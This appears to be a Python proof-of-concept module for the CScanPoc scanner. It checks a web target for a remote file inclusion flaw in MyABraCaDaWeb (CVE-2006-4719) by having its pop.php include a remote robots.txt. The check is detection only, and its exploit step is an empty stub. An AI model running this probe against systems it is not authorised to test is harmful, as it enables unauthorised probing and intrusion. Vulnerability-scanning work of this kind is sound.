# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '36f099e0-3d02-4629-8923-db76ddee10e5'
    name = 'MyABraCaDaWeb <= 1.0.3 (base) Remote File Include Vulnerabilities' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.RFI # 漏洞类型
    disclosure_date = '2006-09-12'  # 漏洞公布时间
    desc = '''
        MyABraCaDaWeb <= 1.0.3 (base)版本存在远程文件包含漏洞。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-63954' # 
    cnvd_id = 'CNVD-2006-6949' # cnvd漏洞编号
    cve_id = 'CVE-2006-4719'  # cve编号
    product = 'MyABraCaDaWeb'  # 漏洞组件名称
    product_version = '<= 1.0.3'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '48917476-0be1-49e2-b857-20e4084ff339' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/pop.php?base=http://baidu.com/robots.txt?'
            response = requests.get(vul_url).content
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()